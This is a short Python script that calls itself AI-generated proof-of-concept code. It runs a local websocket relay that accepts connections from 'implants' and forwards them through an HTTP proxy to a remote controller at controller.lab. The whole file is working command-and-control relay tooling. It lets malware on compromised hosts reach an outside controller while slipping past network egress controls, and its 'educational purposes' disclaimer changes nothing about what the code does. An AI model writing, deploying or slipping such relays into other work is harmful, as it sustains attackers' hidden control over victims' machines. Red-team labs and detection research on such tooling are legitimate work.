# Local relay: accepts local implant connections and proxies to remote controller via proxy.
# Note: This is AI generated code provided as a proof of concept for educational purposes only.  
# Run: python relay.py

import asyncio, json
from websockets import serve
from websocket import create_connection
import threading

UPSTREAM = "ws://controller.lab:8765"   # remote
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 8080
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 9000

def outbound_connect():
    # create outbound websocket-client connection through proxy
    ws_out = create_connection(
        UPSTREAM,
        http_proxy_host=PROXY_HOST,
        http_proxy_port=PROXY_PORT
    )
    return ws_out

async def handle_local(ws_local, path):
    # Create an outbound (to remote) connection in thread to avoid blocking asyncio
    loop = asyncio.get_event_loop()
    ws_out = await loop.run_in_executor(None, outbound_connect)

    stop = False

    def out_to_local():
        nonlocal stop
        try:
            while True:
                msg = ws_out.recv()
                if msg is None:
                    break
                asyncio.run_coroutine_threadsafe(ws_local.send(msg), loop)
        except Exception:
            stop = True
            try:
                asyncio.run_coroutine_threadsafe(ws_local.close(), loop)
            except:
                pass

    t = threading.Thread(target=out_to_local, daemon=True)
    t.start()

    try:
        async for message in ws_local:
            # forward incoming local -> upstream
            try:
                ws_out.send(message)
            except Exception:
                break
    finally:
        try:
            ws_out.close()
        except:
            pass

async def main():
    async with serve(handle_local, LISTEN_HOST, LISTEN_PORT):
        print(f"Relay listening on ws://{LISTEN_HOST}:{LISTEN_PORT} -> upstream {UPSTREAM} via proxy {PROXY_HOST}:{PROXY_PORT}")
        await asyncio.Future()  # run forever

if __name__ == "__main__":
    asyncio.run(main())
